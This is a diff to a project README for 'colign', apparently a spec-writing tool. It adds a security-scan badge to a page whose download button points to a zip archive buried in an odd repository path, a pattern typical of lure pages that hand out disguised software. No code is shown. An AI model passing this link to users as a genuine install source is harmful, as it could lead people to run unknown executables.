@@ -1,6 +1,7 @@
 # 🤖 colign - Write Specs, Align Teams Faster
 
 [![Download colign](https://img.shields.io/badge/Download%20colign-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip)
+[![SafeSkill 79/100](https://img.shields.io/badge/SafeSkill-79%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/invertible-statue269-colign)
 
 ## 🧭 What colign does
 
